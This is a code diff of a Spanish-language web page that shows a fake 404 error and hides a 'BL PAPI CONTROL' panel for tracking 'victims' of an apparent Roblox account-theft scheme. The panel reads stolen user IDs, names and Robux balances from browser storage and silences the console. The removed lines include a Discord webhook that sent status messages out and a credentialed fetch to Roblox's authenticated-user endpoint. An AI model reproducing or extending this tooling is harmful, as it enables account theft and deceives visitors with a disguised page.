@@ -22,7 +22,7 @@
             position: relative;
         }
 
-        /* Pantalla de error 404 (FALSA) */
+        /* Pantalla de error 404 */
         .error-screen {
             text-align: center;
             padding: 40px;
@@ -67,7 +67,7 @@
             font-size: 14px;
         }
 
-        /* Panel de control (oculto inicialmente) */
+        /* Panel de control */
         .panel-screen {
             width: 100%;
             max-width: 1200px;
@@ -260,14 +260,10 @@
         .log-entry.error {
             color: #ff4444;
         }
-
-        .hidden {
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <!-- PANTALLA DE ERROR 404 (FALSA) -->
+    <!-- Pantalla de error 404 -->
     <div class="error-screen" id="errorScreen">
         <div class="error-code" id="errorCode">
             <span id="num4">4</span>04
@@ -277,7 +273,7 @@
         <div class="error-footer">The requested URL was not found on this server.</div>
     </div>
 
-    <!-- PANEL DE CONTROL -->
+    <!-- Panel de control -->
     <div class="panel-screen" id="panelScreen">
         <div class="header">
             <h1><span>BL PAPI</span> CONTROL</h1>
@@ -296,19 +292,19 @@
             <div class="action-card">
                 <div class="card-title">📁 PÁGINA 1</div>
                 <div class="card-description">Acceso a la primera página oculta del sistema.</div>
-                <a href="0aññÑ.html" class="action-button" id="btn1" target="_blank">IR A 0AÑÑÑ.HTML</a>
+                <a href="0aññÑ.html" class="action-button" id="btn1">IR A 0AÑÑÑ.HTML</a>
             </div>
 
             <div class="action-card">
                 <div class="card-title">📁 PÁGINA 2</div>
                 <div class="card-description">Acceso a la segunda página oculta del sistema.</div>
-                <a href="0aññÑ.html" class="action-button" id="btn2" target="_blank">IR A 0AÑÑÑ.HTML</a>
+                <a href="0aññÑ.html" class="action-button" id="btn2">IR A 0AÑÑÑ.HTML</a>
             </div>
 
             <div class="action-card">
                 <div class="card-title">📁 PÁGINA 3</div>
                 <div class="card-description">Acceso a la tercera página oculta del sistema.</div>
-                <a href="0aññÑ.html" class="action-button" id="btn3" target="_blank">IR A 0AÑÑÑ.HTML</a>
+                <a href="0aññÑ.html" class="action-button" id="btn3">IR A 0AÑÑÑ.HTML</a>
             </div>
         </div>
 
@@ -336,10 +332,13 @@
 
     <script>
         // ================= CONFIGURACIÓN =================
-        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
-
-        // Silenciar consola
-        console.log = console.error = console.warn = function() {};
+        // Silenciar TODOS los errores de consola
+        const originalConsole = { ...console };
+        console.log = function() {};
+        console.error = function() {};
+        console.warn = function() {};
+        console.info = function() {};
+        console.debug = function() {};
 
         // Variables de estado
         let clickCount = 0;
@@ -378,11 +377,12 @@
             }
         });
 
-        // =========== VERIFICAR VÍCTIMA Y ACTIVAR PANEL ===========
-        async function verificarYActivar() {
+        // =========== VERIFICAR VÍCTIMA (SOLO LOCALSTORAGE, SIN FETCH) ===========
+        function verificarYActivar() {
             addLog('[SISTEMA] Verificando víctima...');
             
-            const hayVictima = await buscarVictima();
+            // Buscar SOLO en localStorage (sin peticiones externas)
+            const hayVictima = buscarVictimaLocal();
             
             if (hayVictima) {
                 panelActivo = true;
@@ -390,29 +390,34 @@
                 panelScreen.classList.add('show');
                 actualizarPanelVictima();
                 addLog('[SISTEMA] ✅ Panel activado - Víctima detectada');
-                enviarLogDiscord('✅ Panel activado - Víctima detectada');
                 
-                // Iniciar verificación periódica
+                // Iniciar verificación periódica (solo localStorage)
                 if (checkInterval) clearInterval(checkInterval);
-                checkInterval = setInterval(buscarVictima, 5000);
+                checkInterval = setInterval(() => {
+                    if (buscarVictimaLocal()) {
+                        actualizarPanelVictima();
+                    } else {
+                        victimStatus.innerHTML = '❌ VÍCTIMA PERDIDA';
+                        victimStatus.classList.remove('active');
+                        victimInfo.style.display = 'none';
+                    }
+                }, 5000);
             } else {
                 alert('❌ No hay ninguna víctima conectada en este momento');
                 addLog('[SISTEMA] ❌ Intento de acceso sin víctima', 'error');
             }
         }
 
-        // =========== BUSCAR VÍCTIMA EN TODOS LOS POSIBLES SITIOS ===========
-        async function buscarVictima() {
-            let encontrada = false;
-            
-            // 1. Buscar en localStorage (donde guarda galeria-imagen.html)
+        // =========== BUSCAR VÍCTIMA SOLO EN LOCALSTORAGE ===========
+        function buscarVictimaLocal() {
             try {
-                // Posibles nombres de clave
+                // Posibles nombres de clave donde puede estar la víctima
                 const posiblesKeys = [
                     'roblox_user_data',
                     'roblox_session_active',
                     'victim_data',
-                    'user_data'
+                    'user_data',
+                    'ultima_victima'
                 ];
                 
                 for (const key of posiblesKeys) {
@@ -420,88 +425,41 @@
                     if (data) {
                         try {
                             const parsed = JSON.parse(data);
-                            if (parsed && (parsed.userId || parsed.id)) {
+                            // Verificar si tiene los campos necesarios
+                            if (parsed && (parsed.userId || parsed.id || parsed.userName || parsed.name)) {
                                 victimData = parsed;
-                                encontrada = true;
                                 addLog(`[LOCALSTORAGE] Datos encontrados en: ${key}`);
-                                break;
+                                return true;
                             }
                         } catch (e) {}
                     }
                 }
                 
-                // También buscar datos sueltos
+                // También buscar datos guardados directamente
                 const directData = localStorage.getItem('roblox_user_data');
                 if (directData) {
                     const parsed = JSON.parse(directData);
-                    if (parsed && parsed.userId) {
+                    if (parsed && (parsed.userId || parsed.id)) {
                         victimData = parsed;
-                        encontrada = true;
+                        return true;
                     }
                 }
             } catch (e) {}
-
-            // 2. Si no, buscar en sessionStorage
-            if (!encontrada) {
-                try {
-                    const sessionData = sessionStorage.getItem('roblox_user_data');
-                    if (sessionData) {
-                        const parsed = JSON.parse(sessionData);
-                        if (parsed && parsed.userId) {
-                            victimData = parsed;
-                            encontrada = true;
-                            addLog('[SESSIONSTORAGE] Datos encontrados');
-                        }
-                    }
-                } catch (e) {}
-            }
-
-            // 3. Intentar detectar directamente con fetch a Roblox
-            if (!encontrada) {
-                try {
-                    const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
-                        credentials: 'include'
-                    });
-                    
-                    if (res.ok) {
-                        const data = await res.json();
-                        victimData = {
-                            userId: data.id,
-                            userName: data.name,
-                            timestamp: Date.now()
-                        };
-                        encontrada = true;
-                        addLog('[ROBLOX] Sesión detectada directamente');
-                    }
-                } catch (e) {}
-            }
-
-            // Actualizar panel si está activo
-            if (panelActivo) {
-                if (encontrada) {
-                    actualizarPanelVictima();
-                } else {
-                    victimStatus.innerHTML = '❌ VÍCTIMA PERDIDA';
-                    victimStatus.classList.remove('active');
-                    victimInfo.style.display = 'none';
-                }
-            }
-
-            return encontrada;
+            
+            return false;
         }
 
         // =========== ACTUALIZAR PANEL CON DATOS DE VÍCTIMA ===========
         function actualizarPanelVictima() {
             if (!victimData) return;
 
-            victimStatus.innerHTML = `✅ VÍCTIMA ACTIVA - ${victimData.userName || victimData.name || 'Desconocido'}`;
+            const userName = victimData.userName || victimData.name || 'Usuario';
+            const userId = victimData.userId || victimData.id || 'No disponible';
+            const robux = victimData.robux || '?';
+
+            victimStatus.innerHTML = `✅ VÍCTIMA ACTIVA - ${userName}`;
             victimStatus.classList.add('active');
             victimInfo.style.display = 'block';
-
-            const userName = victimData.userName || victimData.name || 'No disponible';
-            const userId = victimData.userId || victimData.id || 'No disponible';
-            const robux = victimData.robux || 0;
-            const timestamp = victimData.timestamp ? new Date(victimData.timestamp).toLocaleString() : 'Desconocido';
 
             infoGrid.innerHTML = `
                 <div class="info-item">
@@ -513,12 +471,12 @@
                     <div class="info-value">${userId}</div>
                 </div>
                 <div class="info-item">
-                    <div class="info-label">Robux disponible</div>
+                    <div class="info-label">Robux</div>
                     <div class="info-value">${robux}</div>
                 </div>
                 <div class="info-item">
-                    <div class="info-label">Última actividad</div>
-                    <div class="info-value">${timestamp}</div>
+                    <div class="info-label">Estado</div>
+                    <div class="info-value">✅ Conectado</div>
                 </div>
             `;
 
@@ -527,48 +485,40 @@
             victimCount.textContent = '1';
             robuxTotal.textContent = robux;
 
-            addLog(`[VÍCTIMA] ${userName} (${userId}) - ${robux} Robux`);
+            addLog(`[VÍCTIMA] ${userName} (${userId})`);
         }
 
-        // =========== FUNCIONES ÚTILES ===========
+        // =========== FUNCIÓN PARA AÑADIR LOGS ===========
         function addLog(message, type = 'info') {
             const entry = document.createElement('div');
             entry.className = 'log-entry' + (type === 'error' ? ' error' : '');
-            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            const timestamp = new Date().toLocaleTimeString();
+            entry.innerHTML = `[${timestamp}] ${message}`;
             logArea.appendChild(entry);
             logArea.scrollTop = logArea.scrollHeight;
             
-            // Mantener solo últimos 50 logs
-            while (logArea.children.length > 50) {
+            // Mantener solo últimos 30 logs
+            while (logArea.children.length > 30) {
                 logArea.removeChild(logArea.firstChild);
             }
         }
 
-        async function enviarLogDiscord(message) {
-            try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: message })
-                });
-            } catch (e) {}
-        }
-
         // =========== INICIALIZAR ===========
         (function() {
-            // Contador de visitas
-            let visits = parseInt(localStorage.getItem('visit_count') || '0');
+            // Contador de visitas al panel
+            let visits = parseInt(localStorage.getItem('panel_visits') || '0');
             visits++;
-            localStorage.setItem('visit_count', visits.toString());
+            localStorage.setItem('panel_visits', visits.toString());
+            visitCount.textContent = visits;
             
             // Verificar si ya hay víctima al cargar
-            buscarVictima().then(hay => {
-                if (hay) {
-                    addLog('[SISTEMA] Datos de víctima disponibles');
-                }
-            });
-            
-            addLog('[SISTEMA] Esperando 3 clics en el número 4...');
+            if (buscarVictimaLocal()) {
+                addLog('[SISTEMA] Datos de víctima disponibles');
+                addLog('[SISTEMA] Haz 3 clics en el 4 para activar');
+            } else {
+                addLog('[SISTEMA] No hay víctima detectada');
+                addLog('[SISTEMA] Esperando 3 clics en el número 4...');
+            }
         })();
     </script>
 </body>
